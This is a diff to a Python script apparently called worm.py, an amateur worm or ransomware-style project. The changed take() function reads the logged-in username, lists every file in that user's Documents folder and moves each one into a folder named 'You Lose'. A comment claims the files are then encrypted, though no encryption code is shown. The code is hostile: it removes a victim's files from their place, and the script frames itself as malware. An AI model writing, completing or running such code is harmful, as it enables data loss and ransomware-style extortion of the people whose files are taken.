@@ -71,11 +71,18 @@ def copy():
 def take():
     #the take method will create a file and send all the other files in that folder
 
-    print('I am staring in the take')
+    #get the username
+    username = os.getlogin()
 
-
-    #get the current location
+    #get the worms location just in case I guess
     location = os.path.abspath("worm.py")
+
+    #check for the worm.py file
+    #if os.path.exists('worm.py'):
+        #get the directory path way
+    #    wormLocation = os.path.dirname('worm.py')
+    #else:
+    #    copy()
 
     #create the folder there??
     directory = 'You Lose'
@@ -84,23 +91,23 @@ def take():
     #copy all of the files in that directory
 
     #i need to list all of the folder in a
-    files = os.listdir(location)
-
+    files = os.listdir("/home/"+username+"/Documents")
     #then loop through all of those files
     for filename in files:
         #want to make the files a full pathway to properly copy
-        full_name = os.path.join(location, filename)
+        full_name = os.path.join("/home/"+username+"/Documents", filename)
         if os.path.isfile(full_name):
 
             #send all of those copies to a new file 
-            shutil.copy(full_name, directory)
+            shutil.move(full_name, directory)
 
-    #maybe encrypt the file idk
+    #It's done moving those files now we encrypted
+
 
 def main():
     print("NOW STARTING")
     copy()
-    
+
 if __name__ == "__main__":
     main()
 
